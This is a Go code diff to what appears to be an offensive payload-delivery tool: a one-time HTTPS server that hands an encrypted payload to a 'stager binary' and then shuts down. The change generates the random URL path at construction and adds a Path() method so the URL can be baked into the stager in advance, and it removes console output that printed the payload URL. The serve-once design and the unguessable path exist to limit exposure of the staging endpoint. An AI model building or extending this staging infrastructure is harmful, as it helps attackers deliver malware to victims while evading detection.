@@ -21,15 +21,25 @@ import (
 // It serves the encrypted payload blob exactly once, then shuts down.
 // This limits exposure: the payload URL is only live until the first download.
 type Server struct {
-	data    []byte
-	port    int
-	served  atomic.Bool
+	data   []byte
+	port   int
+	path   string
+	served atomic.Bool
 }
 
 // NewServer creates a Server that will deliver data over HTTPS on the given port.
+// The random URL path is generated at creation time and can be read via Path()
+// before the server starts — allowing callers to embed the URL in a stager binary
+// before calling ListenAndServe.
 func NewServer(data []byte, port int) *Server {
-	return &Server{data: data, port: port}
+	token, _ := randomHex(8)
+	return &Server{data: data, port: port, path: "/" + token}
 }
+
+// Path returns the random URL path this server will serve on.
+// Available immediately after NewServer — call this before building a stager
+// so the stager URL and the server path match.
+func (s *Server) Path() string { return s.path }
 
 // ListenAndServe starts the one-time HTTPS server and blocks until the payload
 // has been delivered (or the process is interrupted).
@@ -41,20 +51,13 @@ func (s *Server) ListenAndServe() error {
 
 	mux := http.NewServeMux()
 
-	// Random-ish path so the endpoint isn't trivially guessable.
-	token, err := randomHex(8)
-	if err != nil {
-		return err
-	}
-	path := "/" + token
-
 	srv := &http.Server{
 		Addr:      fmt.Sprintf(":%d", s.port),
 		Handler:   mux,
 		TLSConfig: tlsCfg,
 	}
 
-	mux.HandleFunc(path, func(w http.ResponseWriter, r *http.Request) {
+	mux.HandleFunc(s.path, func(w http.ResponseWriter, r *http.Request) {
 		// Only serve once.
 		if !s.served.CompareAndSwap(false, true) {
 			http.NotFound(w, r)
@@ -75,13 +78,6 @@ func (s *Server) ListenAndServe() error {
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		http.NotFound(w, r)
 	})
-
-	addrs, _ := localAddresses()
-	fmt.Printf("[+] One-time payload URL (bake into stager via --url):\n")
-	for _, a := range addrs {
-		fmt.Printf("    https://%s:%d%s\n", a, s.port, path)
-	}
-	fmt.Printf("[i] Server will shut down after one download.\n")
 
 	ln, err := tls.Listen("tcp", fmt.Sprintf(":%d", s.port), tlsCfg)
 	if err != nil {
